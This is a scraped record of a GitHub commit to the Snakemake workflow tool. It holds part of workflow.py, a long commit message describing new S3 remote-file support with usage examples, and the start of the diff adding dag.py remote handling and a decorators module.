prioritytargets=None,\n                quiet=False,\n                keepgoing=False,\n                printshellcmds=False,\n                printreason=False,\n                printdag=False,\n                cluster=None,\n                cluster_config=None,\n                cluster_sync=None,\n                jobname=None,\n                immediate_submit=False,\n                ignore_ambiguity=False,\n                printrulegraph=False,\n                printd3dag=False,\n                drmaa=None,\n                stats=None,\n                force_incomplete=False,\n                ignore_incomplete=False,\n                list_version_changes=False,\n                list_code_changes=False,\n                list_input_changes=False,\n                list_params_changes=False,\n                summary=False,\n                detailed_summary=False,\n                latency_wait=3,\n                benchmark_repeats=3,\n                wait_for_files=None,\n                nolock=False,\n                unlock=False,\n                resources=None,\n                notemp=False,\n                nodeps=False,\n                cleanup_metadata=None,\n                subsnakemake=None,\n                updated_files=None,\n                keep_target_files=False,\n                allowed_rules=None,\n                greediness=1.0,\n                no_hooks=False):\n\n        self.global_resources = dict() if resources is None else resources\n        self.global_resources[\"_cores\"] = cores\n        self.global_resources[\"_nodes\"] = nodes\n\n        def rules(items):\n            return map(self._rules.__getitem__, filter(self.is_rule, items))\n\n        if keep_target_files:\n\n            def files(items):\n                return filterfalse(self.is_rule, items)\n        else:\n\n            def files(items):\n                return map(os.path.relpath, filterfalse(self.is_rule, items))\n\n        if not targets:\n            targets = [self.first_rule\n                       ] if self.first_rule is not None else list()\n        if prioritytargets is None:\n            prioritytargets = list()\n        if forcerun is None:\n            forcerun = list()\n\n        priorityrules = set(rules(prioritytargets))\n        priorityfiles = set(files(prioritytargets))\n        forcerules = set(rules(forcerun))\n        forcefiles = set(files(forcerun))\n        targetrules = set(chain(rules(targets),\n                                filterfalse(Rule.has_wildcards, priorityrules),\n                                filterfalse(Rule.has_wildcards, forcerules)))\n        targetfiles = set(chain(files(targets), priorityfiles, forcefiles))\n        if forcetargets:\n            forcefiles.update(targetfiles)\n            forcerules.update(targetrules)\n\n        rules = self.rules\n        if allowed_rules:\n            rules = [rule for rule in rules if rule.name in set(allowed_rules)]\n\n        if wait_for_files is not None:\n            try:\n                snakemake.io.wait_for_files(wait_for_files,\n                                            latency_wait=latency_wait)\n            except IOError as e:\n                logger.error(str(e))\n                return False\n\n        dag = DAG(\n            self, rules,\n            dryrun=dryrun,\n            targetfiles=targetfiles,\n            targetrules=targetrules,\n            forceall=forceall,\n            forcefiles=forcefiles,\n            forcerules=forcerules,\n            priorityfiles=priorityfiles,\n            priorityrules=priorityrules,\n            ignore_ambiguity=ignore_ambiguity,\n            force_incomplete=force_incomplete,\n            ignore_incomplete=ignore_incomplete or printdag or printrulegraph,\n            notemp=notemp)\n\n        self.persistence = Persistence(\n            nolock=nolock,\n            dag=dag,\n            warn_only=dryrun or printrulegraph or printdag or summary or\n            list_version_changes or list_code_changes or list_input_changes or\n            list_params_changes)\n\n        if cleanup_metadata:\n            for f in cleanup_metadata:\n                self.persistence.cleanup_metadata(f)\n            return True\n\n        dag.init()\n        dag.check_dynamic()\n\n        if unlock:\n            try:\n                self.persistence.cleanup_locks()\n                logger.info(\"Unlocking working directory.\")\n                return True\n            except IOError:\n                logger.error(\"Error: Unlocking the directory {} failed. Maybe \"\n                             \"you don't have the permissions?\")\n                return False\n        try:\n            self.persistence.lock()\n        except IOError:\n            logger.error(\n                \"Error: Directory cannot be locked. Please make \"\n                \"sure that no other Snakemake process is trying to create \"\n                \"the same files in the following directory:\\n{}\\n\"\n                \"If you are sure that no other \"\n                \"instances of snakemake are running on this directory, \"\n                \"the remaining lock was likely caused by a kill signal or \"\n                \"a power loss. It can be removed with \"\n                \"the --unlock argument.\".format(os.getcwd()))\n            return False\n\n        if self.subworkflows and not printdag and not printrulegraph:\n            # backup globals\n            globals_backup = dict(self.globals)\n            # execute subworkflows\n            for subworkflow in self.subworkflows:\n                subworkflow_targets = subworkflow.targets(dag)\n                updated = list()\n                if subworkflow_targets:\n                    logger.info(\n                        \"Executing subworkflow {}.\".format(subworkflow.name))\n                    if not subsnakemake(subworkflow.snakefile,\n                                        workdir=subworkflow.workdir,\n                                        targets=subworkflow_targets,\n                                        updated_files=updated):\n                        return False\n                    dag.updated_subworkflow_files.update(subworkflow.target(f)\n                                                         for f in updated)\n                else:\n                    logger.info(\"Subworkflow {}: Nothing to be done.\".format(\n                        subworkflow.name))\n            if self.subworkflows:\n                logger.info(\"Executing main workflow.\")\n            # rescue globals\n            self.globals.update(globals_backup)\n\n        dag.check_incomplete()\n        dag.postprocess()\n\n        if nodeps:\n            missing_input = [f for job in dag.targetjobs for f in job.input\n                             if dag.needrun(job) and not os.path.exists(f)]\n            if missing_input:\n                logger.error(\n                    \"Dependency resolution disabled (--nodeps) \"\n                    \"but missing input \"\n                    \"files detected. If this happens on a cluster, please make sure \"\n                    \"that you handle the dependencies yourself or turn of \"\n                    \"--immediate-submit. Missing input files:\\n{}\".format(\n                        \"\\n\".join(missing_input)))\n                return False\n\n        updated_files.extend(f for job in dag.needrun_jobs for f in job.output)\n\n        if printd3dag:\n            dag.d3dag()\n            return True\n        elif printdag:\n            print(dag)\n            return True\n        elif printrulegraph:\n            print(dag.rule_dot())\n            return True\n        elif summary:\n            print(\"\\n\".join(dag.summary(detailed=False)))\n            return True\n        elif detailed_summary:\n            print(\"\\n\".join(dag.summary(detailed=True)))\n            return True\n        elif list_version_changes:\n            items = list(\n                chain(*map(self.persistence.version_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n        elif list_code_changes:\n            items = list(chain(*map(self.persistence.code_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n        elif list_input_changes:\n            items = list(chain(*map(self.persistence.input_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n        elif list_params_changes:\n            items = list(\n                chain(*map(self.persistence.params_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n\n        scheduler = JobScheduler(self, dag, cores,\n                                 local_cores=local_cores,\n                                 dryrun=dryrun,\n                                 touch=touch,\n                                 cluster=cluster,\n                                 cluster_config=cluster_config,\n                                 cluster_sync=cluster_sync,\n                                 jobname=jobname,\n                                 immediate_submit=immediate_submit,\n                                 quiet=quiet,\n                                 keepgoing=keepgoing,\n                                 drmaa=drmaa,\n                                 printreason=printreason,\n                                 printshellcmds=printshellcmds,\n                                 latency_wait=latency_wait,\n                                 benchmark_repeats=benchmark_repeats,\n                                 greediness=greediness)\n\n        if not dryrun and not quiet:\n            if len(dag):\n                if cluster or cluster_sync or drmaa:\n                    logger.resources_info(\n                        \"Provided cluster nodes: {}\".format(nodes))\n                else:\n                    logger.resources_info(\"Provided cores: {}\".format(cores))\n                    logger.resources_info(\"Rules claiming more threads will be scaled down.\")\n                provided_resources = format_resources(resources)\n                if provided_resources:\n                    logger.resources_info(\n                        \"Provided resources: \" + provided_resources)\n                ignored_resources = format_resource_names(\n                    set(resource for job in dag.needrun_jobs for resource in\n                        job.resources_dict if resource not in resources))\n                if ignored_resources:\n                    logger.resources_info(\n                        \"Ignored resources: \" + ignored_resources)\n                logger.run_info(\"\\n\".join(dag.stats()))\n            else:\n                logger.info(\"Nothing to be done.\")\n        if dryrun and not len(dag):\n            logger.info(\"Nothing to be done.\")\n\n        success = scheduler.schedule()\n\n        if success:\n            if dryrun:\n                if not quiet and len(dag):\n                    logger.run_info(\"\\n\".join(dag.stats()))\n            elif stats:\n                scheduler.stats.to_json(stats)\n            if not dryrun and not no_hooks:\n                self._onsuccess(logger.get_logfile())\n            return True\n        else:\n            if not dryrun and not no_hooks:\n                self._onerror(logger.get_logfile())\n            return False\n\n    def include(self, snakefile,\n                overwrite_first_rule=False,\n                print_compilation=False,\n                overwrite_shellcmd=None):\n        \"\"\"\n        Include a snakefile.\n        \"\"\"\n        # check if snakefile is a path to the filesystem\n        if not urllib.parse.urlparse(snakefile).scheme:\n            if not os.path.isabs(snakefile) and self.included_stack:\n                current_path = os.path.dirname(self.included_stack[-1])\n                snakefile = os.path.join(current_path, snakefile)\n            snakefile = os.path.abspath(snakefile)\n        # else it could be an url.\n        # at least we don't want to modify the path for clarity.\n\n        if snakefile in self.included:\n            logger.info(\"Multiple include of {} ignored\".format(snakefile))\n            return\n        self.included.append(snakefile)\n        self.included_stack.append(snakefile)\n\n        global workflow\n\n        workflow = self\n\n        first_rule = self.first_rule\n        code, linemap = parse(snakefile,\n                              overwrite_shellcmd=self.overwrite_shellcmd)\n\n        if print_compilation:\n            print(code)\n\n        # insert the current directory into sys.path\n        # this allows to import modules from the workflow directory\n        sys.path.insert(0, os.path.dirname(snakefile))\n\n        self.linemaps[snakefile] = linemap\n        exec(compile(code, snakefile, \"exec\"), self.globals)\n        if not overwrite_first_rule:\n            self.first_rule = first_rule\n        self.included_stack.pop()\n\n    def onsuccess(self, func):\n        self._onsuccess = func\n\n    def onerror(self, func):\n        self._onerror = func\n\n    def workdir(self, workdir):\n        if self.overwrite_workdir is None:\n            if not os.path.exists(workdir):\n                os.makedirs(workdir)\n            self._workdir = workdir\n            os.chdir(workdir)\n\n    def configfile(self, jsonpath):\n        \"\"\" Update the global config with the given dictionary. \"\"\"\n        global config\n        c = snakemake.io.load_configfile(jsonpath)\n        update_config(config, c)\n        update_config(config, self.overwrite_config)\n\n    def ruleorder(self, *rulenames):\n        self._ruleorder.add(*rulenames)\n\n    def subworkflow(self, name, snakefile=None, workdir=None):\n        sw = Subworkflow(self, name, snakefile, workdir)\n        self._subworkflows[name] = sw\n        self.globals[name] = sw.target\n\n    def localrules(self, *rulenames):\n        self._localrules.update(rulenames)\n\n    def rule(self, name=None, lineno=None, snakefile=None):\n        name = self.add_rule(name, lineno, snakefile)\n        rule = self.get_rule(name)\n\n        def decorate(ruleinfo):\n            if ruleinfo.input:\n                rule.set_input(*ruleinfo.input[0], **ruleinfo.input[1])\n            if ruleinfo.output:\n                rule.set_output(*ruleinfo.output[0], **ruleinfo.output[1])\n            if ruleinfo.params:\n                rule.set_params(*ruleinfo.params[0], **ruleinfo.params[1])\n            if ruleinfo.threads:\n                if not isinstance(ruleinfo.threads, int):\n                    raise RuleException(\"Threads value has to be an integer.\",\n                                        rule=rule)\n                rule.resources[\"_cores\"] = ruleinfo.threads\n            if ruleinfo.resources:\n                args, resources = ruleinfo.resources\n                if args:\n                    raise RuleException(\"Resources have to be named.\")\n                if not all(map(lambda r: isinstance(r, int),\n                               resources.values())):\n                    raise RuleException(\n                        \"Resources values have to be integers.\",\n                        rule=rule)\n                rule.resources.update(resources)\n            if ruleinfo.priority:\n                if (not isinstance(ruleinfo.priority, int) and\n                    not isinstance(ruleinfo.priority, float)):\n                    raise RuleException(\"Priority values have to be numeric.\",\n                                        rule=rule)\n                rule.priority = ruleinfo.priority\n            if ruleinfo.version:\n                rule.version = ruleinfo.version\n            if ruleinfo.log:\n                rule.set_log(*ruleinfo.log[0], **ruleinfo.log[1])\n            if ruleinfo.message:\n                rule.message = ruleinfo.message\n            if ruleinfo.benchmark:\n                rule.benchmark = ruleinfo.benchmark\n            rule.norun = ruleinfo.norun\n            rule.docstring = ruleinfo.docstring\n            rule.run_func = ruleinfo.func\n            rule.shellcmd = ruleinfo.shellcmd\n            ruleinfo.func.__name__ = \"__{}\".format(name)\n            self.globals[ruleinfo.func.__name__] = ruleinfo.func\n            setattr(rules, name, rule)\n            return ruleinfo.func\n\n        return decorate\n\n    def docstring(self, string):\n        def decorate(ruleinfo):\n            ruleinfo.docstring = string\n            return ruleinfo\n\n        return decorate\n\n    def input(self, *paths, **kwpaths):\n        def decorate(ruleinfo):\n            ruleinfo.input = (paths, kwpaths)\n            return ruleinfo\n\n        return decorate\n\n    def output(self, *paths, **kwpaths):\n        def decorate(ruleinfo):\n            ruleinfo.output = (paths, kwpaths)\n            return ruleinfo\n\n        return decorate\n\n    def params(self, *params, **kwparams):\n        def decorate(ruleinfo):\n            ruleinfo.params = (params, kwparams)\n            return ruleinfo\n\n        return decorate\n\n    def message(self, message):\n        def decorate(ruleinfo):\n            ruleinfo.message = message\n            return ruleinfo\n\n        return decorate\n\n    def benchmark(self, benchmark):\n        def decorate(ruleinfo):\n            ruleinfo.benchmark = benchmark\n            return ruleinfo\n\n        return decorate\n\n    def threads(self, threads):\n        def decorate(ruleinfo):\n            ruleinfo.threads = threads\n            return ruleinfo\n\n        return decorate\n\n    def resources(self, *args, **resources):\n        def decorate(ruleinfo):\n            ruleinfo.resources = (args, resources)\n            return ruleinfo\n\n        return decorate\n\n    def priority(self, priority):\n        def decorate(ruleinfo):\n            ruleinfo.priority = priority\n            return ruleinfo\n\n        return decorate\n\n    def version(self, version):\n        def decorate(ruleinfo):\n            ruleinfo.version = version\n            return ruleinfo\n\n        return decorate\n\n    def log(self, *logs, **kwlogs):\n        def decorate(ruleinfo):\n            ruleinfo.log = (logs, kwlogs)\n            return ruleinfo\n\n        return decorate\n\n    def shellcmd(self, cmd):\n        def decorate(ruleinfo):\n            ruleinfo.shellcmd = cmd\n            return ruleinfo\n\n        return decorate\n\n    def norun(self):\n        def decorate(ruleinfo):\n            ruleinfo.norun = True\n            return ruleinfo\n\n        return decorate\n\n    def run(self, func):\n        return RuleInfo(func)\n\n    @staticmethod\n    def _empty_decorator(f):\n        return f\n\n\nclass RuleInfo:\n    def __init__(self, func):\n        self.func = func\n        self.shellcmd = None\n        self.norun = False\n        self.input = None\n        self.output = None\n        self.params = None\n        self.message = None\n        self.benchmark = None\n        self.threads = None\n        self.resources = None\n        self.priority = None\n        self.version = None\n        self.log = None\n        self.docstring = None\n\n\nclass Subworkflow:\n    def __init__(self, workflow, name, snakefile, workdir):\n        self.workflow = workflow\n        self.name = name\n        self._snakefile = snakefile\n        self._workdir = workdir\n\n    @property\n    def snakefile(self):\n        if self._snakefile is None:\n            return os.path.abspath(os.path.join(self.workdir, \"Snakefile\"))\n        if not os.path.isabs(self._snakefile):\n            return os.path.abspath(os.path.join(self.workflow.basedir,\n                                                self._snakefile))\n        return self._snakefile\n\n    @property\n    def workdir(self):\n        workdir = \".\" if self._workdir is None else self._workdir\n        if not os.path.isabs(workdir):\n            return os.path.abspath(os.path.join(self.workflow.basedir,\n                                                workdir))\n        return workdir\n\n    def target(self, paths):\n        if not_iterable(paths):\n            return flag(os.path.join(self.workdir, paths), \"subworkflow\", self)\n        return [self.target(path) for path in paths]\n\n    def targets(self, dag):\n        return [f for job in dag.jobs for f in job.subworkflow_input\n                if job.subworkflow_input[f] is self]\n\n\nclass Rules:\n    \"\"\" A namespace for rules so that they can be accessed via dot notation. \"\"\"\n    pass\n\n\ndef srcdir(path):\n    \"\"\"Return the absolute path, relative to the source directory of the current Snakefile.\"\"\"\n    if not workflow.included_stack:\n        return None\n    return os.path.join(os.path.dirname(workflow.included_stack[-1]), path)\n"}}, "msg": "Initial commit with support for remote files.\n\nThis introduces changes that scratch an itch within our research group for remote file support, and I hope the new functionality will be useful for others as well.\n\nWhat is it all about? Wouldn't it be wonderful if you would use Snakemake with remote data stored on Amazon S3? Imagine being able to read and write the same files as your collaborators without rsyncing files back and forth or using pricey network-attached storage. Want to output and store 1PB of small files? Want to let someone else worry about durability? Want to work with large files locally that you can store individually but that are too large in aggregate? The support for remote storage introduced with these changes will allow you do all of these things! Remote storage is initially intended to work with AWS S3 and things sporting a similar API, though it is flexible enough that would could extended it to support other remote providers. It expect you to already have an S3 bucket setup, and API credentials for it permitting read/write access.\n\nHere's how you use it:\n\nThe `Snakefile` now supports a wrapper function, `remote()`, indicating a file is on a remote storage provider (this is similar to `temp()` or `protected()`). During rule execution, the file (or object) specified, is downloaded to the `cwd`, within a sub-directory bearing the same name as the bucket. This lets you have multiple remote origins with reduced likelihood of name collisions, and allows snakemake to easily translate remote objects to local file paths. The `remote()` wrapper is mutually-exclusive with the `temp()` and `protected()` wrappers.\n\nThe implementation of all communication with the remote storage provider is specified in a class passed as a keyword argument to the remote wrapper. This class defines methods related to being a RemoteObject(). By default, the S3 provider is used and it does not need to be specified explicitly. If you are interested in creating a custom remote storage provider for whatever system you are using, implement the methods defined in the abstract base class `snakemake.remote_providers.RemoteObjectProvider`. Take a look at the S3 provider for an example implementation. To use a custom remote storage provider implementation (FTP, etc.), import it within your `Snakefile`, and set the `provider` keyword argument, as is being done with S3 below:\n\n    import snakemake.remote_providers.S3 as S3\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\", provider=S3)\n\nSince S3 is the default remote storage provider, it can be omitted from the `Snakefile`:\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\")\n\nAdditional kwargs can be passed to the remote provider this way to set credentials, should you not want to rely on whichever credentials happen to be stored in the environment variables (suggestion: if using multiple buckets with different credentials, read in the key and secret within your `Snakefile` and pass as appropriate to the `remote()` wrappers). For the S3 provider, the additional kwargs are passed straight through to the boto `connect_s3()` method, so refer to the [boto docs](https://boto.readthedocs.org/en/latest/ref/s3.html#boto.s3.connection.S3Connection) to see the available parameters:\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\", provider=S3, additional_kwargs={\"aws_access_key_id\":\"myKey\", \"aws_secret_access_key\":\"mySecret\"})\n\nThis can also be used to specify a custom URL to connect to rather than AWS, for a different service offering an S3-like API:\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\", provider=S3, additional_kwargs={\"host\":\"mystorageapi.example.com\"})\n\nFor any storage backend with an API deviating significantly from that of S3, it may make sense to create a new remote provider.\n\nExpand still works as expected, just wrap the expansion:\n\n    rule all:\n        input:\n            remote(expand(\"bucket-name/{letter}-2.txt\", letter=[\"A\", \"B\", \"C\"]), provider=S3)\n\nOnly remote files needed to satisfy the DAG build are downloaded for the workflow.  By default, remote files downloaded prior to rule execution and are removed locally as soon as no rules depend on them. Remote files can be explicitly kept by setting the `keep=True` keyword argument:\n\n    rule all:\n        input: remote('bucket-name/prefix{split_id}.txt', keep=True)\n\nIf you wish to have a rule to simply download a file to a local copy, you can do so by declaring the same file path locally as is used by the remote file:\n\n    rule all:\n        input:\n            remote(\"bucket-name/out.txt\")\n        output:\n            \"bucket-name/out.txt\"\n        run:\n            shell(\"cp {output[0]} ./\")\n\nHere's a brief summary of the changes. I tried to minimize the impact on existing code, relying where possible on external classes, new functions, and the use of decorators to connect them.\n\nWithin `io.py`, the usage of flags has been extended to store not just boolean values, but also objects. This is how, for example, the remote provider is passed to the `_IOFile()` object.\n\nSeveral methods of `_IOFile()` now bear a decorator \"@_referToRemote\". When called, this decorator ensures that for files flagged as `remote()`, the methods defined in the class for the remote provider are used rather than the local equivalents specified within the `_IOFile()` class of `io.py`.\n\nThe `dag.py` file has been updated to have a `handle_remote()` method that is responsible for handling remote files after job execution. It uploads files that are not remote, and removes local files flagged as remote when they are no longer needed (exception: if the `\"keep=True\"` argument is provided to `remote()`).\n\nA `decorators.py` file has been added for general-purpose decorators. Currently in use is `@decAllMethods`, which is a class decorator that applies a specified decorator to all methods of a decorated class. This is used with in the `test_remote/` unit test to help mock out methods of `RemoteObject()`.\n\nTwo new exceptions have been added, `RemoteFileException()` and `S3FileException()`. These could probably be used more.\n\nThe `jobs.py` file has been changed to add methods related to assessing remote files for a given job. It also has two new functions used in `dag.py` `handle_remote()` to delete remote-containing directories when they are empty after purging local copies of remote files. It also adds `expanded_input()`, which is used in `handle_remote()` to help determine which wildcard/dynamic files should be removed after job execution. The function `expanded_input()` would benefit from a critical eye.\n\nThe `rules.py` file has a small change causing newly expanded `_IOFile`s to clone the flags of their unexpanded sources. There's probably a better way.\n\nThe `workflow.py` file has been modified to import the new `glob_wildcards_remote()` helper function from `io.py`. This function is the remote analog to `glob_wildcards()`, but it needs to know the remote provider (S3 is default).\n\nA unit test has been added, `test_remote/`. This is similar in nature to the function `test_cluster_dynamic/`. For testing, the `moto` package is used to mock out boto, so that remote file tests do not need to hit the live S3 API.\n\nThese changes have the following dependencies (as represented in setup.py):\n* boto>=2.38.0 (for making AWS/S3 API calls)\n* filechunkio>=1.6 (for file chunking prior to multipart upload, avoiding wheel reinvention)\n* moto>=0.4.14 (for mocking up local S3 \"buckets\" for unit testing)\n\nThis is a first pass at support for remote storage support, and feedback is welcome. The intent was to add remote file support while make minimal changes to existing Snakemake logic."}}, "https://github.com/kyleabeauchamp/mirrorsnake": {"7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d": {"url": "https://api.github.com/repos/kyleabeauchamp/mirrorsnake/commits/7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d", "html_url": "https://github.com/kyleabeauchamp/mirrorsnake/commit/7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d", "message": "Initial commit with support for remote files.\n\nThis introduces changes that scratch an itch within our research group for remote file support, and I hope the new functionality will be useful for others as well.\n\nWhat is it all about? Wouldn't it be wonderful if you would use Snakemake with remote data stored on Amazon S3? Imagine being able to read and write the same files as your collaborators without rsyncing files back and forth or using pricey network-attached storage. Want to output and store 1PB of small files? Want to let someone else worry about durability? Want to work with large files locally that you can store individually but that are too large in aggregate? The support for remote storage introduced with these changes will allow you do all of these things! Remote storage is initially intended to work with AWS S3 and things sporting a similar API, though it is flexible enough that would could extended it to support other remote providers. It expect you to already have an S3 bucket setup, and API credentials for it permitting read/write access.\n\nHere's how you use it:\n\nThe `Snakefile` now supports a wrapper function, `remote()`, indicating a file is on a remote storage provider (this is similar to `temp()` or `protected()`). During rule execution, the file (or object) specified, is downloaded to the `cwd`, within a sub-directory bearing the same name as the bucket. This lets you have multiple remote origins with reduced likelihood of name collisions, and allows snakemake to easily translate remote objects to local file paths. The `remote()` wrapper is mutually-exclusive with the `temp()` and `protected()` wrappers.\n\nThe implementation of all communication with the remote storage provider is specified in a class passed as a keyword argument to the remote wrapper. This class defines methods related to being a RemoteObject(). By default, the S3 provider is used and it does not need to be specified explicitly. If you are interested in creating a custom remote storage provider for whatever system you are using, implement the methods defined in the abstract base class `snakemake.remote_providers.RemoteObjectProvider`. Take a look at the S3 provider for an example implementation. To use a custom remote storage provider implementation (FTP, etc.), import it within your `Snakefile`, and set the `provider` keyword argument, as is being done with S3 below:\n\n    import snakemake.remote_providers.S3 as S3\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\", provider=S3)\n\nSince S3 is the default remote storage provider, it can be omitted from the `Snakefile`:\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\")\n\nAdditional kwargs can be passed to the remote provider this way to set credentials, should you not want to rely on whichever credentials happen to be stored in the environment variables (suggestion: if using multiple buckets with different credentials, read in the key and secret within your `Snakefile` and pass as appropriate to the `remote()` wrappers). For the S3 provider, the additional kwargs are passed straight through to the boto `connect_s3()` method, so refer to the [boto docs](https://boto.readthedocs.org/en/latest/ref/s3.html#boto.s3.connection.S3Connection) to see the available parameters:\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\", provider=S3, additional_kwargs={\"aws_access_key_id\":\"myKey\", \"aws_secret_access_key\":\"mySecret\"})\n\nThis can also be used to specify a custom URL to connect to rather than AWS, for a different service offering an S3-like API:\n\n    rule all:\n        input:\n            remote(\"bucket-name/file.txt\", provider=S3, additional_kwargs={\"host\":\"mystorageapi.example.com\"})\n\nFor any storage backend with an API deviating significantly from that of S3, it may make sense to create a new remote provider.\n\nExpand still works as expected, just wrap the expansion:\n\n    rule all:\n        input:\n            remote(expand(\"bucket-name/{letter}-2.txt\", letter=[\"A\", \"B\", \"C\"]), provider=S3)\n\nOnly remote files needed to satisfy the DAG build are downloaded for the workflow.  By default, remote files downloaded prior to rule execution and are removed locally as soon as no rules depend on them. Remote files can be explicitly kept by setting the `keep=True` keyword argument:\n\n    rule all:\n        input: remote('bucket-name/prefix{split_id}.txt', keep=True)\n\nIf you wish to have a rule to simply download a file to a local copy, you can do so by declaring the same file path locally as is used by the remote file:\n\n    rule all:\n        input:\n            remote(\"bucket-name/out.txt\")\n        output:\n            \"bucket-name/out.txt\"\n        run:\n            shell(\"cp {output[0]} ./\")\n\nHere's a brief summary of the changes. I tried to minimize the impact on existing code, relying where possible on external classes, new functions, and the use of decorators to connect them.\n\nWithin `io.py`, the usage of flags has been extended to store not just boolean values, but also objects. This is how, for example, the remote provider is passed to the `_IOFile()` object.\n\nSeveral methods of `_IOFile()` now bear a decorator \"@_referToRemote\". When called, this decorator ensures that for files flagged as `remote()`, the methods defined in the class for the remote provider are used rather than the local equivalents specified within the `_IOFile()` class of `io.py`.\n\nThe `dag.py` file has been updated to have a `handle_remote()` method that is responsible for handling remote files after job execution. It uploads files that are not remote, and removes local files flagged as remote when they are no longer needed (exception: if the `\"keep=True\"` argument is provided to `remote()`).\n\nA `decorators.py` file has been added for general-purpose decorators. Currently in use is `@decAllMethods`, which is a class decorator that applies a specified decorator to all methods of a decorated class. This is used with in the `test_remote/` unit test to help mock out methods of `RemoteObject()`.\n\nTwo new exceptions have been added, `RemoteFileException()` and `S3FileException()`. These could probably be used more.\n\nThe `jobs.py` file has been changed to add methods related to assessing remote files for a given job. It also has two new functions used in `dag.py` `handle_remote()` to delete remote-containing directories when they are empty after purging local copies of remote files. It also adds `expanded_input()`, which is used in `handle_remote()` to help determine which wildcard/dynamic files should be removed after job execution. The function `expanded_input()` would benefit from a critical eye.\n\nThe `rules.py` file has a small change causing newly expanded `_IOFile`s to clone the flags of their unexpanded sources. There's probably a better way.\n\nThe `workflow.py` file has been modified to import the new `glob_wildcards_remote()` helper function from `io.py`. This function is the remote analog to `glob_wildcards()`, but it needs to know the remote provider (S3 is default).\n\nA unit test has been added, `test_remote/`. This is similar in nature to the function `test_cluster_dynamic/`. For testing, the `moto` package is used to mock out boto, so that remote file tests do not need to hit the live S3 API.\n\nThese changes have the following dependencies (as represented in setup.py):\n* boto>=2.38.0 (for making AWS/S3 API calls)\n* filechunkio>=1.6 (for file chunking prior to multipart upload, avoiding wheel reinvention)\n* moto>=0.4.14 (for mocking up local S3 \"buckets\" for unit testing)\n\nThis is a first pass at support for remote storage support, and feedback is welcome. The intent was to add remote file support while make minimal changes to existing Snakemake logic.", "sha": "7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d", "keyword": "remote code execution protect", "diff": "diff --git a/setup.py b/setup.py\nindex dfea1dd..97f4d86 100644\n--- a/setup.py\n+++ b/setup.py\n@@ -59,6 +59,7 @@ def run_tests(self):\n     },\n     package_data={'': ['*.css', '*.sh', '*.html']},\n     tests_require=['nose>=1.3'],\n+    install_requires=['boto>=2.38.0','filechunkio>=1.6', 'moto>=0.4.14'],\n     cmdclass={'test': NoseTestCommand},\n     classifiers=\n     [\"Development Status :: 5 - Production/Stable\", \"Environment :: Console\",\ndiff --git a/snakemake/dag.py b/snakemake/dag.py\nindex f1ead14..e591550 100644\n--- a/snakemake/dag.py\n+++ b/snakemake/dag.py\n@@ -10,7 +10,7 @@\n from functools import partial, lru_cache\n from operator import itemgetter, attrgetter\n \n-from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files\n+from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged\n from snakemake.jobs import Job, Reason\n from snakemake.exceptions import RuleException, MissingInputException\n from snakemake.exceptions import MissingRuleException, AmbiguousRuleException\n@@ -288,6 +288,51 @@ def unneeded_files():\n             logger.info(\"Removing temporary output file {}.\".format(f))\n             f.remove()\n \n+    def handle_remote(self, job):\n+        \"\"\" Remove local files if they are no longer needed, and upload to S3. \"\"\"\n+        \n+        needed = lambda job_, f: any(\n+            f in files for j, files in self.depending[job_].items()\n+            if not self.finished(j) and self.needrun(j) and j != job)\n+\n+        remote_files = set([f for f in job.expanded_input if f.is_remote]) | set([f for f in job.expanded_output if f.is_remote])\n+        local_files = set([f for f in job.input if not f.is_remote]) | set([f for f in job.expanded_output if not f.is_remote])\n+        files_to_keep = set(f for f in remote_files if is_flagged(f, \"keep\"))\n+\n+        # remove local files from list of remote files\n+        # in case the same file is specified in both places\n+        remote_files -= local_files\n+        remote_files -= files_to_keep\n+\n+        def unneeded_files():\n+            for job_, files in self.dependencies[job].items():\n+                for f in (remote_files & files):\n+                    if not needed(job_, f) and not f.protected:\n+                        yield f\n+            for f in filterfalse(partial(needed, job), [f for f in remote_files]):\n+                if not f in self.targetfiles and not f.protected:\n+                    yield f\n+\n+        def expanded_dynamic_depending_input_files():\n+            for j in self.depending[job]:    \n+                for f in j.expanded_input:\n+                    yield f\n+\n+        unneededFiles = set(unneeded_files())\n+        unneededFiles -= set(expanded_dynamic_depending_input_files())\n+\n+        for f in [f for f in job.expanded_output if f.is_remote]:\n+            if not f.exists_remote:\n+                logger.info(\"Uploading local output file to remote: {}\".format(f))\n+                f.upload_to_remote()\n+\n+        for f in set(unneededFiles):\n+            logger.info(\"Removing local output file: {}\".format(f))\n+            f.remove()\n+\n+        job.rmdir_empty_remote_dirs()\n+\n+\n     def jobid(self, job):\n         if job not in self._jobid:\n             self._jobid[job] = len(self._jobid)\ndiff --git a/snakemake/decorators.py b/snakemake/decorators.py\nnew file mode 100644\nindex 0000000..063ddde\n--- /dev/null\n+++ b/snakemake/decorators.py\n@@ -0,0 +1,31 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+import functools\n+import inspect\n+\n+\n+def memoize(obj):\n+    cache = obj.cache = {}\n+\n+    @functools.wraps(obj)\n+    def memoizer(*args, **kwargs):\n+        key = str(args) + str(kwargs)\n+        if key not in cache:\n+            cache[key] = obj(*args, **kwargs)\n+        return cache[key]\n+\n+    return memoizer\n+\n+\n+def decAllMethods(decorator, prefix='test_'):\n+\n+    def decClass(cls):\n+        for name, m in inspect.getmembers(cls, inspect.isfunction):\n+            if prefix == None or name.startswith(prefix):\n+                setattr(cls, name, decorator(m))\n+        return cls\n+\n+    return decClass\ndiff --git 